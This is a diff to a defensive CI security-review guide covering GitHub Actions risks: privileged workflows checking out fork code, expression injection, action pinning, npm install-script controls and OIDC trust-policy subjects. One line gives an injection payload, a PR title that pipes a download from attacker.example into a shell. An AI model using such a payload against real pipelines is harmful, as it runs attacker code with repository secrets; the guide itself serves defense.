@@ -16,6 +16,8 @@ Check each of these on any change that handles a credential:
 
 ## CI pipelines (GitHub Actions)
 
+The full workflow review procedure (cache poisoning, `persist-credentials: false`, `secrets: inherit`, environments) is in infrastructure-ops `references/github-actions.md`.
+
 **Untrusted code with privileged context.** `pull_request_target` and `workflow_run` run with the base repository's secrets and a write-capable `GITHUB_TOKEN`. GitHub's guidance is that such workflows must not check out untrusted code. The dangerous shape:
 
 ```yaml
@@ -30,7 +32,9 @@ jobs:
       - run: npm ci && npm test   # runs the fork's package.json scripts with secrets available
 ```
 
-Run untrusted PR code under `pull_request` with no secrets and read-only permissions. If a privileged step needs results from it (commenting, labelling), pass artifacts to a separate `workflow_run` job that treats them as data and never executes them.
+actions/checkout v7, and the v6.1.0, v5.1.0 and v4.4.0 backports, refuse this checkout unless `allow-unsafe-pr-checkout: true` is set, so on current versions that input is the marker to search for. A `git fetch origin pull/<n>/head` or `gh pr checkout` in a `run` step bypasses the guard and is the same bug.
+
+Run untrusted PR code under `pull_request` with no secrets and read-only permissions. If a privileged step needs results from it (commenting, labeling), pass artifacts to a separate `workflow_run` job that treats them as data and never executes them.
 
 **Expression injection.** `${{ }}` is substituted into the script text before the shell runs, so a PR title of `"; curl attacker.example/x | sh; "` executes.
 
@@ -46,7 +50,7 @@ Run untrusted PR code under `pull_request` with no secrets and read-only permiss
 
 Attacker-controlled contexts include issue and PR titles and bodies, comment bodies, branch names (`head_ref`), commit messages and author names.
 
-**Supply chain.** Pin third-party actions to a full commit SHA; GitHub documents this as the only way to use an action as an immutable release. Set `permissions:` at the top of each workflow to the minimum (often `contents: read`) and widen per job. Package installs in CI use the lockfile (`npm ci`, `pip install --require-hashes` where the project supports it). Internal package names should be registered or scoped on the public registry to prevent dependency confusion.
+**Supply chain.** Pin third-party actions to a full commit SHA; GitHub documents this as the only way to use an action as an immutable release. Set `permissions:` at the top of each workflow to the minimum (often `contents: read`) and widen per job. Package installs in CI use the lockfile (`npm ci`, `pip install --require-hashes` where the project supports it). npm 12 and later skip dependency install scripts unless the package is listed in `allowScripts` in `package.json`, so an addition to that list, or `--dangerously-allow-all-scripts` in a workflow, lets third-party code run at install time and gets reviewed like code. The project's own lifecycle scripts still run, which is why `npm ci` on a fork's checkout executes the fork's code. Internal package names should be registered or scoped on the public registry to prevent dependency confusion.
 
 **OIDC to the cloud.** Replace stored cloud keys with OIDC federation (`permissions: id-token: write` on the job that needs it). The cloud trust policy must constrain the subject; GitHub states you must define at least one condition so untrusted repositories cannot obtain tokens. For AWS:
 
@@ -59,7 +63,7 @@ Attacker-controlled contexts include issue and PR titles and bodies, comment bod
 }
 ```
 
-Failure shapes: `StringLike` with `repo:my-org/*` (any repo in the org, including ones any member can create), `repo:my-org/app:*` (any branch and any `pull_request` run), or no `sub` condition at all. Bind production roles to a protected environment with required reviewers. Check the exact subject format your repository emits before writing the condition; GitHub documents that repositories created after July 15, 2026 use a default subject format that includes owner and repository ids.
+Failure shapes: `StringLike` with `repo:my-org/*` (any repo in the org, including ones any member can create), `repo:my-org/app:*` (any branch and any `pull_request` run), or no `sub` condition at all. Bind production roles to a protected environment with required reviewers. Check the exact subject format your repository emits before writing the condition. Repositories created after July 15, 2026, repositories renamed or transferred after that date, and older ones that opted in use the immutable form `repo:OWNER@OWNER-ID/REPO@REPO-ID:...` (for example `repo:my-org@123456/deploy-service@456789:environment:production`); a condition written in the old form rejects every token from them, and the tempting fix of widening it to `StringLike` is the failure above.
 
 ## Secret ownership and rotation
 
